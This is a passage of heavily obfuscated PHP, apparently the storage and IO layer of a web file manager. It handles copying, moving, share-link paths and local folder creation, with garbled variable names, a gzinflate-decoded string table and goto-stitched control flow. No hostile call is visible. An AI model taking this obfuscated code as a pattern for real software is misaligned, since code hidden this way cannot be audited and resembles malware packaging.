} ignore_timeout(); $Î×Áƒ¦§ = self::driverMake($ê³¿•); $ì‡ËÁ˜’ = self::driverMake($áªË¶õ); $Â¼úÕ”¬ = $§ÉÁÏÂ == $ãÑ‚ÌÅé[652]; $è“¥ˆª = !1; if ($ì‡ËÁ˜’->pathParse[$ãÑ‚ÌÅé[1333]]) { $è“¥ˆª = $ì‡ËÁ˜’; $áªË¶õ = $ì‡ËÁ˜’->pathParse[$ãÑ‚ÌÅé[1333]]; $ì‡ËÁ˜’ = self::driverMake($áªË¶õ); } if ($Î×Áƒ¦§->pathParse[$ãÑ‚ÌÅé[1333]]) { $ê³¿• = $Î×Áƒ¦§->pathParse[$ãÑ‚ÌÅé[1333]]; $Î×Áƒ¦§ = self::driverMake($ê³¿•); } self::check($Î×Áƒ¦§, $ê³¿•, $ì‡ËÁ˜’, $áªË¶õ); Hook::trigger($ãÑ‚ÌÅé[1334], $Î×Áƒ¦§, $ê³¿•, $ì‡ËÁ˜’, $áªË¶õ); $¢¥ÓÕ = self::driverIsSame($Î×Áƒ¦§, $ì‡ËÁ˜’); if ($¢¥ÓÕ) { if ($§ÉÁÏÂ == $ãÑ‚ÌÅé[652] && !method_exists($ì‡ËÁ˜’, $ãÑ‚ÌÅé[1335]) && trim($áªË¶õ, $ãÑ‚ÌÅé[8]) == trim($ì‡ËÁ˜’->pathFather($ê³¿•), $ãÑ‚ÌÅé[8])) { if ($Î×Áƒ¦§->pathThis($ê³¿•) != $âÇ¢š˜æ && !$Î×Áƒ¦§->isOsDriver()) { return $Î×Áƒ¦§->rename($ê³¿•, $âÇ¢š˜æ); } return $ì‡ËÁ˜’->getPathOuter($ê³¿•); } if (method_exists($ì‡ËÁ˜’, $§ÉÁÏÂ)) { return $ì‡ËÁ˜’->{$§ÉÁÏÂ}($ê³¿•, $áªË¶õ, $ëÚ—úÀ, $âÇ¢š˜æ); } } if ($¢¥ÓÕ && $§ÉÁÏÂ == $ãÑ‚ÌÅé[652] && $ì‡ËÁ˜’->getType() == $ãÑ‚ÌÅé[116]) { $ÜŞ˜ş×¯ = $ì‡ËÁ˜’->movePath($ê³¿•, $áªË¶õ, $âÇ¢š˜æ); if ($ÜŞ˜ş×¯) { return $ÜŞ˜ş×¯; } } $¯¦ÒÚŸ = $Î×Áƒ¦§->isFile($ê³¿•); if (!$¯¦ÒÚŸ && $ì‡ËÁ˜’->getType() == $ãÑ‚ÌÅé[860] && $Î×Áƒ¦§->getType() == $ãÑ‚ÌÅé[116]) { $ÜŞ˜ş×¯ = $ì‡ËÁ˜’->copyFolderFromIO($Î×Áƒ¦§, $ê³¿•, $áªË¶õ, $ëÚ—úÀ, $Â¼úÕ”¬, $âÇ¢š˜æ); } else { $ÜŞ˜ş×¯ = self::copyPath($Î×Áƒ¦§, $ê³¿•, $ì‡ËÁ˜’, $áªË¶õ, $ëÚ—úÀ, $Â¼úÕ”¬, $¯¦ÒÚŸ, $âÇ¢š˜æ); } if ($ÜŞ˜ş×¯ && $Â¼úÕ”¬) { $Î×Áƒ¦§->remove($ê³¿•); } if ($è“¥ˆª) { $ÜŞ˜ş×¯ = $è“¥ˆª->getPathOuter($ÜŞ˜ş×¯); } return $ÜŞ˜ş×¯; } private static function check($úÅÇÃş, $Ô€”‹İ¿, $µ‹è‰°‚, &$ñşÒÆ¯‚) { $é¥œÕØ =& $_SERVER[øşô´çË]; if (self::driverIsSame($úÅÇÃş, $µ‹è‰°‚) && $úÅÇÃş->isFolder($Ô€”‹İ¿) && $úÅÇÃş->isParentOf($Ô€”‹İ¿, $ñşÒÆ¯‚)) { show_json(LNG($é¥œÕØ[1336]), !1); } if (!$úÅÇÃş->exist($Ô€”‹İ¿)) { show_json(LNG($é¥œÕØ[115]), !1); } } private static function copyPath($ï“Õ˜ëÛ, $ç”Ÿ¥ğÉ, $æÎÜ»ÃŒ, $À¼‚‰™ú, $ÍÑ åŒ•, $´®’Ïãæ, $ÉİÊÒàë, $„÷àÄÙ­ = false, $¨ûò†Äò = true) { $éŸãÍÌ· =& $_SERVER[øşô´çË]; $÷Ù¾§Ú = empty($„÷àÄÙ­) && $„÷àÄÙ­ !== $éŸãÍÌ·[238] ? $ï“Õ˜ëÛ->pathThis($ç”Ÿ¥ğÉ) : $„÷àÄÙ­; if ($ÍÑ åŒ•) { $€ÓßØ“¨ = $æÎÜ»ÃŒ->fileNameExist($À¼‚‰™ú, $÷Ù¾§Ú); $´´Ï®Àæ = $÷Ù¾§Ú; $÷Ù¾§Ú = $æÎÜ»ÃŒ->fileNameAuto($À¼‚‰™ú, $÷Ù¾§Ú, $ÍÑ åŒ•, !$ÉİÊÒàë); if (!$€ÓßØ“¨ || $´´Ï®Àæ != $÷Ù¾§Ú) { $ÍÑ åŒ• = !1; } if ($¨ûò†Äò && !$ÍÑ åŒ•) { $æÎÜ»ÃŒ->_data[$éŸãÍÌ·[1337]] = !0; } } if ($ÉİÊÒàë) { return self::copyFile($ï“Õ˜ëÛ, $ç”Ÿ¥ğÉ, $æÎÜ»ÃŒ, $À¼‚‰™ú, $÷Ù¾§Ú, $´®’Ïãæ); } if ($ÍÑ åŒ• == REPEAT_RENAME_FOLDER) { $ÍÑ åŒ• = !1; } $ÏÙªÄìõ = rtrim($À¼‚‰™ú, $éŸãÍÌ·[8]) . $éŸãÍÌ·[8] . $÷Ù¾§Ú; $¸ê²ß‘Ö = $æÎÜ»ÃŒ->mkdir($æÎÜ»ÃŒ->getPath($ÏÙªÄìõ), $ÍÑ åŒ•); $À¼‚‰™ú = $æÎÜ»ÃŒ->getPathInner($¸ê²ß‘Ö); $ó ÛáÒ€ = $ï“Õ˜ëÛ->listPath($ç”Ÿ¥ğÉ, !0); $ó ÛáÒ€ = is_array($ó ÛáÒ€) ? $ó ÛáÒ€ : array($éŸãÍÌ·[96] => array(), $éŸãÍÌ·[95] => array()); $¶‘ĞÈè­ = array_merge($ó ÛáÒ€[$éŸãÍÌ·[96]], $ó ÛáÒ€[$éŸãÍÌ·[95]]); foreach ($¶‘ĞÈè­ as $±Ó†¥æõ) { $ï„óÒ‘œ = $±Ó†¥æõ[$éŸãÍÌ·[43]] == $éŸãÍÌ·[240]; $ç”Ÿ¥ğÉ = $ï“Õ˜ëÛ->getPathInner($±Ó†¥æõ[$éŸãÍÌ·[97]]); $ÁÉ‘è = self::copyPath($ï“Õ˜ëÛ, $ç”Ÿ¥ğÉ, $æÎÜ»ÃŒ, $À¼‚‰™ú, $ÍÑ åŒ•, $´®’Ïãæ, $ï„óÒ‘œ, !1, !1); if (!$ÁÉ‘è) { IO::errorTips($éŸãÍÌ·[1338] . $ç”Ÿ¥ğÉ . $éŸãÍÌ·[83] . $À¼‚‰™ú); } } self::copyMoveKeepInfo($ï“Õ˜ëÛ, $ç”Ÿ¥ğÉ, $¸ê²ß‘Ö); return $¸ê²ß‘Ö; } private static function copyFile($µ¯ù„÷Û, $£ä–õæñ, $—³ßêÖú, $¤ïÅÖ–, $»¤¤”ÖØ, $¸‹…‘¥§) { $¼®¥Ÿ€ø =& $_SERVER[øşô´çË]; $¤ïÅÖ– = $—³ßêÖú->getPath(rtrim($¤ïÅÖ–, $¼®¥Ÿ€ø[8]) . $¼®¥Ÿ€ø[8] . $»¤¤”ÖØ); $®§½†­º = $¼®¥Ÿ€ø[1339] . time() . rand_string(5); Hook::trigger($¼®¥Ÿ€ø[1340], $µ¯ù„÷Û, $£ä–õæñ, $—³ßêÖú, $¤ïÅÖ–, $»¤¤”ÖØ, $®§½†­º); if (self::driverIsSame($µ¯ù„÷Û, $—³ßêÖú)) { if ($¸‹…‘¥§) { $ÌÙÆÖä­ = $—³ßêÖú->moveFile($£ä–õæñ, $¤ïÅÖ–); } else { $ÌÙÆÖä­ = $—³ßêÖú->copyFile($£ä–õæñ, $¤ïÅÖ–); } Hook::trigger($¼®¥Ÿ€ø[1341], $µ¯ù„÷Û, $£ä–õæñ, $—³ßêÖú, $¤ïÅÖ–, $»¤¤”ÖØ, $ÌÙÆÖä­); self::copyMoveKeepInfo($µ¯ù„÷Û, $£ä–õæñ, $ÌÙÆÖä­); return $ÌÙÆÖä­; } $å÷Ö€ÓÕ = TEMP_FILES; if ($GLOBALS[$¼®¥Ÿ€ø[6]][$¼®¥Ÿ€ø[102]][$¼®¥Ÿ€ø[900]]) { $å÷Ö€ÓÕ = $GLOBALS[$¼®¥Ÿ€ø[6]][$¼®¥Ÿ€ø[102]][$¼®¥Ÿ€ø[900]]; } $ê¶–Æ± = $å÷Ö€ÓÕ; mk_dir($ê¶–Æ±); $„ó›€Ç = $ê¶–Æ± . $®§½†­º; $Ñ †Óøï = $„ó›€Ç; $„ó›€Ç = $µ¯ù„÷Û->download($£ä–õæñ, $„ó›€Ç); $„ó›€Ç = $µ¯ù„÷Û->iconvApp($„ó›€Ç); if (substr($„ó›€Ç, strlen($å÷Ö€ÓÕ)) == $å÷Ö€ÓÕ) { $¸‹…‘¥§ = !0; } $ÌÙÆÖä­ = $—³ßêÖú->upload($¤ïÅÖ–, $„ó›€Ç, $¸‹…‘¥§); self::remove($Ñ †Óøï); Hook::trigger($¼®¥Ÿ€ø[1341], $µ¯ù„÷Û, $£ä–õæñ, $—³ßêÖú, $¤ïÅÖ–, $»¤¤”ÖØ, $ÌÙÆÖä­); self::copyMoveKeepInfo($µ¯ù„÷Û, $£ä–õæñ, $ÌÙÆÖä­); return $ÌÙÆÖä­; } private static function copyMoveKeepInfo($ò…¸ù¬–, $Ç©ŒßÛ¾, $ùä‰À›¯) { if (!$ùä‰À›¯) { return; } $ÒşËÂêÖ = $ò…¸ù¬–->info($Ç©ŒßÛ¾); if (!is_array($ÒşËÂêÖ)) { return; } IO::setModifyTime($ùä‰À›¯, $ÒşËÂêÖ[$_SERVER[øşô´çË][98]]); } public static function pathFather($ÈÚ¼—¢š) { $„ÑÁ¡ê = IO::init($ÈÚ¼—¢š); $Ê’Œåµ´ = $„ÑÁ¡ê->pathFather($„ÑÁ¡ê->path); return $„ÑÁ¡ê->getPathOuter($Ê’Œåµ´); } public static function fileOut($¬ˆ ëìµ, $Ëí®íò  = false, $¬ŒıİÆ = false, $Å­ä›Êƒ = '') { $³Õ©î–Í = self::driverMake($¬ˆ ëìµ); if ($³Õ©î–Í->isFileOutServer()) { return $³Õ©î–Í->fileOutServer($¬ˆ ëìµ, $Ëí®íò , $¬ŒıİÆ, $Å­ä›Êƒ); } return $³Õ©î–Í->fileOut($¬ˆ ëìµ, $Ëí®íò , $¬ŒıİÆ, $Å­ä›Êƒ); } public static function fileOutImage($ãçÉñò£, $½ÃµÓŸ = 250) { $×Šò”ÄÛ = array(250, 600, 1200, 2000, 3000, 5000); for ($ê±Ï¯¯¶ = 0; $ê±Ï¯¯¶ < count($×Šò”ÄÛ); $ê±Ï¯¯¶++) { if ($ê±Ï¯¯¶ == 0 && $½ÃµÓŸ <= $×Šò”ÄÛ[$ê±Ï¯¯¶]) { $½ÃµÓŸ = $×Šò”ÄÛ[$ê±Ï¯¯¶]; break; } else { if ($½ÃµÓŸ > $×Šò”ÄÛ[$ê±Ï¯¯¶ - 1] && $½ÃµÓŸ <= $×Šò”ÄÛ[$ê±Ï¯¯¶]) { $½ÃµÓŸ = $×Šò”ÄÛ[$ê±Ï¯¯¶]; break; } else { if ($ê±Ï¯¯¶ == count($×Šò”ÄÛ) - 1 && $½ÃµÓŸ > $×Šò”ÄÛ[$ê±Ï¯¯¶]) { $½ÃµÓŸ = $×Šò”ÄÛ[$ê±Ï¯¯¶]; break; } } } } $ñ†¥Ó¢Ò = self::driverMake($ãçÉñò£); if ($ñ†¥Ó¢Ò->isFileOutServer()) { return $ñ†¥Ó¢Ò->fileOutImageServer($ãçÉñò£, $½ÃµÓŸ); } return $ñ†¥Ó¢Ò->fileOutImage($ãçÉñò£, $½ÃµÓŸ); } private static function driverIsSame($÷û˜‹ª, $¼øÉÚú÷) { $³éşèï =& $_SERVER[øşô´çË]; $ÒğŸ­Ù± = $÷û˜‹ª->getType(); $ÒÁù¸¬— = $¼øÉÚú÷->getType(); if ($ÒğŸ­Ù± != $ÒÁù¸¬—) { return !1; } if ($ÒğŸ­Ù± == $³éşèï[860]) { return !0; } if ($ÒğŸ­Ù± == $³éşèï[116]) { return !0; } if ($÷û˜‹ª->pathDriver == $¼øÉÚú÷->pathDriver) { return !0; } return !1; } public static function copyUpdate($Û˜âûè, $ÑÁ¼Ä´‰) { $ùÓàÍ¯î =& $_SERVER[øşô´çË]; if (!IO::exist($Û˜âûè)) { return !1; } if (!IO::exist($ÑÁ¼Ä´‰)) { IO::mkdir($ÑÁ¼Ä´‰); } $›ÄŞ»Ñœ = array_to_keyvalue(self::listAllSimple($Û˜âûè), $ùÓàÍ¯î[97]); $è­ò›Á¨ = array_to_keyvalue(self::listAllSimple($ÑÁ¼Ä´‰), $ùÓàÍ¯î[97]); $”¬ŒË† = array(); $™¼ìÉ¯ = array(); foreach ($›ÄŞ»Ñœ as $ˆïöÇú˜ => $âö˜Ã®») { if (isset($è­ò›Á¨[$ˆïöÇú˜])) { if ($âö˜Ã®»[$ùÓàÍ¯î[88]] == 1) { continue; } if ($è­ò›Á¨[$ˆïöÇú˜][$ùÓàÍ¯î[89]] == $âö˜Ã®»[$ùÓàÍ¯î[89]]) { continue; } } if ($âö˜Ã®»[$ùÓàÍ¯î[88]] == 1) { $™¼ìÉ¯[] = $ÑÁ¼Ä´‰ . $ùÓàÍ¯î[8] . trim($ˆïöÇú˜, $ùÓàÍ¯î[8]); continue; } $“ñƒû§ = strstr(trim($ˆïöÇú˜, $ùÓàÍ¯î[8]), $ùÓàÍ¯î[8]) ? get_path_father($ˆïöÇú˜) : $ùÓàÍ¯î[12]; $”¬ŒË†[] = array($ùÓàÍ¯î[1342] => $âö˜Ã®»[$ùÓàÍ¯î[99]], $ùÓàÍ¯î[1343] => rtrim($ÑÁ¼Ä´‰, $ùÓàÍ¯î[8]) . $ùÓàÍ¯î[8] . $“ñƒû§, $ùÓàÍ¯î[1344] => $âö˜Ã®»); } $Š²Á¶ê = array($ùÓàÍ¯î[240] => $”¬ŒË†, $ùÓàÍ¯î[88] => $™¼ìÉ¯); Hook::trigger($ùÓàÍ¯î[1345], $Û˜âûè, $ÑÁ¼Ä´‰, $Š²Á¶ê); foreach ($™¼ìÉ¯ as $âö˜Ã®») { IO::mkdir($âö˜Ã®»); } foreach ($”¬ŒË† as $âö˜Ã®») { IO::copy($âö˜Ã®»[$ùÓàÍ¯î[1342]], $âö˜Ã®»[$ùÓàÍ¯î[1343]], REPEAT_REPLACE); } } public static function fileSubstr($ÇÒÉÖ½é, $¶‘İµœ, $ß¦“Üµæ = false) { $‰š¦ˆÆ =& $_SERVER[øşô´çË]; $ó€ÁêÁ = self::driverMake($ÇÒÉÖ½é); $óáÒŸ« = $ó€ÁêÁ->size($ÇÒÉÖ½é); $§òÄĞœ® = $¶‘İµœ; $ó´¦ö‰½ = $ß¦“Üµæ; if ($¶‘İµœ < 0) { $¶‘İµœ = $óáÒŸ« + $¶‘İµœ; } if ($ß¦“Üµæ === !1) { $ß¦“Üµæ = $óáÒŸ« - $¶‘İµœ; } if ($¶‘İµœ + $ß¦“Üµæ > $óáÒŸ«) { $ß¦“Üµæ = $óáÒŸ« - $¶‘İµœ; } if (!$óáÒŸ« && $ó€ÁêÁ->getType() == $‰š¦ˆÆ[116] && !$ó€ÁêÁ->exist($ÇÒÉÖ½é)) { $‡²¼Ôœ© = get_path_this($ÇÒÉÖ½é); $Œ×üº = parse_url_query($‡²¼Ôœ©); if (is_array($Œ×üº) && isset($Œ×üº[$‰š¦ˆÆ[42]])) { $‡²¼Ôœ© = urldecode($Œ×üº[$‰š¦ˆÆ[42]]); } throw new Exception($‰š¦ˆÆ[1346] . LNG($‰š¦ˆÆ[1347]) . $‰š¦ˆÆ[1130] . clear_html($‡²¼Ôœ©) . $‰š¦ˆÆ[12]); } if ($ß¦“Üµæ <= 0) { return $‰š¦ˆÆ[12]; } if ($¶‘İµœ < 0 || $¶‘İµœ >= $óáÒŸ« || $ß¦“Üµæ > $GLOBALS[$‰š¦ˆÆ[6]][$‰š¦ˆÆ[102]][$‰š¦ˆÆ[1348]]) { throw new Exception("\x66\151\x6c\145\122\145\x61\144\x20\145\162\x72\157\x72\54\x6f\166\145\x72\x20\x69\x6f\122\145\141\x64\115\141\x78\41\x20\163\x74\141\x72\164\75{$¶‘İµœ}\73\x6c\145\x6e\x67\164\x68\x3d{$ß¦“Üµæ}\73\x20\163\x69\x7a\145\x3d{$óáÒŸ«}\73"); } $ä°³£öŠ = $ó€ÁêÁ->fileSubstr($ÇÒÉÖ½é, $¶‘İµœ, $ß¦“Üµæ); if (!$ä°³£öŠ && $ß¦“Üµæ && isset($GLOBALS[$‰š¦ˆÆ[1349]])) { throw new Exception($GLOBALS[$‰š¦ˆÆ[1349]][$‰š¦ˆÆ[1350]]); } return $ä°³£öŠ; } private static function driverMake(&$éîÁ˜êŞ) { $ÄËî¯ü =& $_SERVER[øşô´çË]; $¬ïîø× = KodIO::parse($éîÁ˜êŞ); if (!self::$driverListSystem) { $ÖÓÔ±Ùò = Model($ÄËî¯ü[870])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÖÓÔ±Ùò, $ÄËî¯ü[496]); } if ($¬ïîø×[$ÄËî¯ü[43]] == KodIO::KOD_IO && !self::$driverListSystem[$¬ïîø×[$ÄËî¯ü[496]]]) { throw new Exception($ÄËî¯ü[1351]); return !1; } $éîÁ˜êŞ = $¬ïîø×[$ÄËî¯ü[1352]]; $•¯Ñï¼“ = self::driverGet($¬ïîø×, $éîÁ˜êŞ); return $•¯Ñï¼“; } private static function driverGet($•¢çòˆ, &$ªé¯„º¾) { $ëÌÑÒú =& $_SERVER[øşô´çË]; $¬Ê¸ÀŸœ = $•¢çòˆ[$ëÌÑÒú[1353]]; $±“ûÜ¬ = $•¢çòˆ[$ëÌÑÒú[496]]; switch ($•¢çòˆ[$ëÌÑÒú[43]]) { case KodIO::KOD_IO: $² Áë† = self::$driverListSystem[$±“ûÜ¬]; break; case KodIO::KOD_SOURCE: $ªé¯„º¾ = $±“ûÜ¬ . $ªé¯„º¾; $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1355], $ëÌÑÒú[6] => $•¢çòˆ); $² Áë†[$ëÌÑÒú[6]][$ëÌÑÒú[1356]] = $•¢çòˆ[$ëÌÑÒú[496]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $óÄ¿İµ› = $GLOBALS[$ëÌÑÒú[1357]]; self::$driverListUser = array_to_keyvalue($óÄ¿İµ›, $ëÌÑÒú[496]); } $² Áë† = self::$driverListUser[$±“ûÜ¬]; break; case KodIO::KOD_SHARE_LINK: $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1358], $ëÌÑÒú[6] => $•¢çòˆ); $á½À»«İ = Action($ëÌÑÒú[1359])->sharePathInfo($•¢çòˆ[$ëÌÑÒú[97]]); $ªé¯„º¾ = $á½À»«İ[$ëÌÑÒú[201]]; if (!$á½À»«İ[$ëÌÑÒú[201]]) { $Ğ©›îĞ = Model($ëÌÑÒú[695])->getInfoByHash($•¢çòˆ[$ëÌÑÒú[496]]); $ªé¯„º¾ = KodIO::clear($Ğ©›îĞ[$ëÌÑÒú[592]] . $•¢çòˆ[$ëÌÑÒú[1352]]); $•¢çòˆ[$ëÌÑÒú[585]] = $Ğ©›îĞ; $•¢çòˆ[$ëÌÑÒú[1333]] = $ªé¯„º¾; $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1360], $ëÌÑÒú[6] => $•¢çòˆ); } else { $² Áë†[$ëÌÑÒú[6]][$ëÌÑÒú[1356]] = $á½À»«İ[$ëÌÑÒú[201]]; } break; case KodIO::KOD_SHARE_ITEM: $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1361], $ëÌÑÒú[6] => $•¢çòˆ); $Ğ©›îĞ = Model($ëÌÑÒú[695])->getInfo($•¢çòˆ[$ëÌÑÒú[496]]); if ($Ğ©›îĞ[$ëÌÑÒú[201]] == $ëÌÑÒú[238]) { $ªé¯„º¾ = KodIO::clear($Ğ©›îĞ[$ëÌÑÒú[592]] . $•¢çòˆ[$ëÌÑÒú[1352]]); $•¢çòˆ[$ëÌÑÒú[585]] = $Ğ©›îĞ; $•¢çòˆ[$ëÌÑÒú[1333]] = $ªé¯„º¾; $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1362], $ëÌÑÒú[6] => $•¢çòˆ); } else { if (!$ªé¯„º¾) { $ªé¯„º¾ = $Ğ©›îĞ[$ëÌÑÒú[201]]; } $² Áë†[$ëÌÑÒú[6]][$ëÌÑÒú[1356]] = $Ğ©›îĞ[$ëÌÑÒú[201]]; } break; case KodIO::KOD_SHARE_OUTER: $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1363], $ëÌÑÒú[6] => $•¢çòˆ); break; default: $ªé¯„º¾ = $•¢çòˆ[$ëÌÑÒú[97]]; $² Áë† = array($ëÌÑÒú[1354] => $ëÌÑÒú[1364]); break; } $ÉôÔ ı— = $•¢çòˆ[$ëÌÑÒú[97]]; if (!isset(self::$driverCache[$ÉôÔ ı—])) { $õ˜ÙÔæÆ = strtolower($² Áë†[$ëÌÑÒú[106]]); $©ôÀÃ®± = $GLOBALS[$ëÌÑÒú[6]][$ëÌÑÒú[102]][$ëÌÑÒú[936]]; $Ñ¯ÄÛ˜ = $ëÌÑÒú[87] . (isset($©ôÀÃ®±[$õ˜ÙÔæÆ]) ? $©ôÀÃ®±[$õ˜ÙÔæÆ] : ucfirst($õ˜ÙÔæÆ)); if (!class_exists($Ñ¯ÄÛ˜)) { show_json("{$Ñ¯ÄÛ˜}\x20\x6e\157\164\x20\145\170\151\x73\164\x73\x21", !1); } $¥‹ı©÷€ = isset($² Áë†[$ëÌÑÒú[6]]) ? $² Áë†[$ëÌÑÒú[6]] : !1; self::$driverCache[$ÉôÔ ı—] = new $Ñ¯ÄÛ˜($¥‹ı©÷€); } $ªµÖÙ›ª = self::$driverCache[$ÉôÔ ı—]; $ªµÖÙ›ª->pathDriver = $¬Ê¸ÀŸœ; $ªµÖÙ›ª->pathBase = $ëÌÑÒú[12]; if (isset($² Áë†[$ëÌÑÒú[6]][$ëÌÑÒú[1365]])) { $ªµÖÙ›ª->pathBase = rtrim($² Áë†[$ëÌÑÒú[6]][$ëÌÑÒú[1365]], $ëÌÑÒú[8]) . $ëÌÑÒú[8]; $ªé¯„º¾ = $ªµÖÙ›ª->pathBase . ltrim($ªé¯„º¾, $ëÌÑÒú[8]); } $ªé¯„º¾ = $ªµÖÙ›ª->getPath($ªé¯„º¾); if (isset($•¢çòˆ[$ëÌÑÒú[1333]])) { $ªé¯„º¾ = $•¢çòˆ[$ëÌÑÒú[1333]]; } $ªµÖÙ›ª->path = $ªé¯„º¾; return $ªµÖÙ›ª; } public static function errorTips($š¡ãÈË± = false, $³¨üìÕ‡ = true) { $Óö†¬Ê =& $_SERVER[øşô´çË]; static $ØÀ¥ãˆ = array(); $¦®…¯£ = 100; if ($š¡ãÈË± === -1) { return $ØÀ¥ãˆ ? $ØÀ¥ãˆ[count($ØÀ¥ãˆ) - 1] : $Óö†¬Ê[12]; } if ($š¡ãÈË± === !1) { return implode($Óö†¬Ê[19], $ØÀ¥ãˆ); } if (count($ØÀ¥ãˆ) >= $¦®…¯£) { $ØÀ¥ãˆ = array_slice($ØÀ¥ãˆ, $¦®…¯£ * 0.5, $¦®…¯£); } $ØÀ¥ãˆ[] = $š¡ãÈË±; if (!$³¨üìÕ‡) { return; } write_log($Óö†¬Ê[183] . ACTION . $Óö†¬Ê[1366] . $š¡ãÈË±, $Óö†¬Ê[1367]); } public static function getLastError($òéşŞœì = '') { $£ßœí—ü = self::errorTips(-1); return $£ßœí—ü ? $£ßœí—ü : $òéşŞœì; } } goto A’Öô‚øŸé; c²Âãêí¢„: if (!$zcsujirwtv) { die; } $_SERVER[¸ƒÏ­ÍÄ] = explode($_SERVER[øşô´çË][711], gzinflate(substr($_SERVER[øşô´çË][712], 10, -8))); $zadctgyxhf = $_SERVER[øşô´çË][713]; goto dâñÕñ£Æ—; a‘á½Ö·îÆ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $²»Ü²ÓÒ =& $_SERVER[øşô´çË]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$²»Ü²ÓÒ[6]] =& $config; $this->values[$²»Ü²ÓÒ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $²»Ü²ÓÒ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($İŒööŸ) { if (1 === func_num_args()) { $this->{$İŒööŸ} = new $İŒööŸ(); } else { $ëò‚ê¡ò = new ReflectionClass($İŒööŸ); $’Á«…ä¿ = func_get_args(); array_shift($’Á«…ä¿); $this->{$İŒööŸ} = $ëò‚ê¡ò->newInstanceArgs($’Á«…ä¿); } return $this->{$İŒööŸ}; } public function routeBind($·Û·‹¤ä, $è·¢åÕô, $ûƒ‡üÑ™ = 3) { $‡ô²É  =& $_SERVER[øşô´çË]; $µÉîÊ¢” = $this->in[$‡ô²É [9]]; $·Û·‹¤ä = str_replace($‡ô²É [10], $‡ô²É [11], trim(trim($·Û·‹¤ä, $‡ô²É [8]), $‡ô²É [12])); if (!$·Û·‹¤ä || count($µÉîÊ¢”) <= $ûƒ‡üÑ™) { return !1; } $ğˆñºÕ = !0; $Ó§œ¨¼ = explode($‡ô²É [8], $·Û·‹¤ä); for ($ˆ·˜á–Ò = 0; $ˆ·˜á–Ò < count($Ó§œ¨¼); $ˆ·˜á–Ò++) { if ($Ó§œ¨¼[$ˆ·˜á–Ò] != $µÉîÊ¢”[$ûƒ‡üÑ™ + $ˆ·˜á–Ò]) { $ğˆñºÕ = !1; break; } } if (!$ğˆñºÕ) { return; } call_user_func_array(array($this, $è·¢åÕô), array()); } public function routeArgs($Şô·ûü´ = 3) { $µŞˆœ± = $this->in[$_SERVER[øşô´çË][9]]; if (count($µŞˆœ±) <= $Şô·ûü´) { return array(); } $·ğ¹²“ = array(); for ($‰â…Ó« = $Şô·ûü´; $‰â…Ó« < count($µŞˆœ±); $‰â…Ó« += 2) { $·ğ¹²“[$µŞˆœ±[$‰â…Ó«]] = $µŞˆœ±[$‰â…Ó« + 1]; $this->in[$µŞˆœ±[$‰â…Ó«]] = $µŞˆœ±[$‰â…Ó« + 1]; } return $·ğ¹²“; } protected function assign($¦ÔŒ¼‘ä, $Ö¸Ö¹öï) { $this->values[$¦ÔŒ¼‘ä] = $Ö¸Ö¹öï; } protected function display($¸´Œ¡³Ø) { ob_end_clean(); extract($this->values); require $this->tpl . $¸´Œ¡³Ø; } } $_file = $_SERVER[$_SERVER[øşô´çË][13]]; $_size = $_SERVER[øşô´çË][14]; goto c®¯°³‡ƒÔ; AÇÑ¨¦İ°ó: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ä‡÷¤÷) { if (substr($Ä‡÷¤÷, 0, 2) == $_SERVER[øşô´çË][1519]) { $Ä‡÷¤÷ = BASIC_PATH . substr($Ä‡÷¤÷, 2); } return $Ä‡÷¤÷; } public function iconvApp($ø‹ÂªÚ‡) { $‚éÂï‘› =& $_SERVER[øşô´çË]; global $config; return $this->iconvTo($ø‹ÂªÚ‡, $config[$‚éÂï‘›[1643]], $config[$‚éÂï‘›[1642]]); } public function iconvSystem($ø»­íÉ°) { $“ıòŠ§ =& $_SERVER[øşô´çË]; global $config; return $this->iconvTo($ø»­íÉ°, $config[$“ıòŠ§[1642]], $config[$“ıòŠ§[1643]]); } public function getPathOuter($£²Ä¯‡–) { $Ë ìéÊ =& $_SERVER[øşô´çË]; $ñ—°åÁú = $this->iconvApp($this->pathBase); $£²Ä¯‡– = $this->iconvApp($£²Ä¯‡–); if (substr($ñ—°åÁú, 0, 2) == $Ë ìéÊ[1519]) { $ñ—°åÁú = BASIC_PATH . substr($ñ—°åÁú, 2); } if (substr($£²Ä¯‡–, 0, 2) == $Ë ìéÊ[1519]) { $£²Ä¯‡– = BASIC_PATH . substr($£²Ä¯‡–, 2); } $ñ—°åÁú = KodIO::clear($ñ—°åÁú); $£²Ä¯‡– = KodIO::clear($£²Ä¯‡–); $£²Ä¯‡– = substr($£²Ä¯‡–, strlen($ñ—°åÁú)); if (empty($this->pathDriver)) { return $£²Ä¯‡–; } return $this->pathDriver . $Ë ìéÊ[8] . ltrim($£²Ä¯‡–, $Ë ìéÊ[8]); } public function mkfile($åˆòƒº†, $ú•·” = '', $”øŸ‡ò¼ = REPEAT_RENAME) { $åˆòƒº† = $this->iconvSystem($åˆòƒº†); @touch($åˆòƒº†); if ($ú•·”) { file_put_contents($åˆòƒº†, $ú•·”); } @chmod($åˆòƒº†, $this->pathAuth); if (is_file($åˆòƒº†)) { return $this->getPathOuter($åˆòƒº†); } $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } public function mkdir($¶ËÙÊ‹ß, $‚©ÆĞË¾ = REPEAT_SKIP) { $¶ËÙÊ‹ß = $this->iconvSystem($¶ËÙÊ‹ß); if (is_dir($¶ËÙÊ‹ß)) { return $this->getPathOuter($¶ËÙÊ‹ß); } @mkdir($¶ËÙÊ‹ß, $this->pathAuth, !0); @chmod($¶ËÙÊ‹ß, $this->pathAuth); if (is_dir($¶ËÙÊ‹ß)) { return $this->getPathOuter($¶ËÙÊ‹ß); } $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][1654], !0); return !1; } public function copyFile($Ï¨áê³“, $¾’ßîÄ) { 